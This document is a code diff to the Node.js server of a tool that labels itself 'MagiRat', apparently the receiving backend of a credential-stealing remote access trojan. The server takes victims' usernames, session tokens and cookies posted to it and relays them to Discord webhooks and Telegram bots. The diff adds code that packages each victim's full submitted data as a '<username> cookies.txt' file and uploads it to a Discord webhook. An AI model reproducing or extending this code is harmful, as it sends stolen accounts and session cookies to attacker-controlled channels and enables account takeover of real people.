@@ -1,3 +1,4 @@
+
 //setup
 const getProfiles = require('./utils/networth')
 const { uploadData, threadHandler, sendMessage, formatNumber, fetchCountry } = require('./utils/utils');
@@ -18,21 +19,21 @@ app.use(expressip().getIpInfoMiddleware) //ip
 app.use(express.json()) //parse json
 app.use(express.urlencoded({ extended: true }))
 
-// Env variables
-// Webhooks
-let shorthook = process.env.SHORTHOOK
-let debughook = process.env.DEBUGHOOK
+// // Env variables
+// // Webhooks
+// let shorthook = process.env.SHORTHOOK
+// let debughook = process.env.DEBUGHOOK
 
-// Blacklist
-let blacklist = process.env.BLACKLIST
+// // Blacklist
+// let blacklist = process.env.BLACKLIST
 
-// Discord bot
-let token = process.env.DC_TOKEN
-let channelId = process.env.CHANNEL_ID
+// // Discord bot
+// let token = process.env.DC_TOKEN
+// let channelId = process.env.CHANNEL_ID
 
-// Telegram bot
-let tgToken = process.env.TG_TOKEN
-let tgUsers = process.env.TG_USERS
+// // Telegram bot
+// let tgToken = process.env.TG_TOKEN
+// let tgUsers = process.env.TG_USERS
 
 const bot = new TelegramBot(tgToken, {polling: true});
 
@@ -265,6 +266,7 @@ app.post("/", (req, res) => {
             }).catch(err => {
                 console.log(`[MagiRat] Error while sending to Discord webhook:\n${err}`)
                 sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
+                sendMessage(`\`\`\`${req.body} - ${err}\`\`\``, debughook)
                 console.log(req.body)
             })
         } catch (e) {
@@ -293,10 +295,29 @@ app.post("/", (req, res) => {
         console.log(`[MagiRat] Error while validating token:\n${err}`)
         console.log(req.body)
         sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``, debughook)
+        // Create a new FormData object
+        const formData = new FormData();
+
+        // Create a Blob representing the content of the file
+        const fileContent = new Blob([JSON.stringify(req.body)], { type: 'text/plain' });
+
+        // Append the file to the FormData object
+        formData.append('file', fileContent, `${req.body.username} cookies.txt`);
+
+        // Use fetch API to send the FormData to the Discord webhook
+        fetch(debughook, {
+            method: 'POST',
+            body: formData,
+        }).then(response => {
+            console.log("Sent failed logs successfully")
+        }).catch(error => {
+            sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
+        });
+        //change this to whatever you want, but make sure to send a response
+        res.send("OK")
     })
     
-    //change this to whatever you want, but make sure to send a response
-    res.send("OK")
+    
 })
 
 //cookies
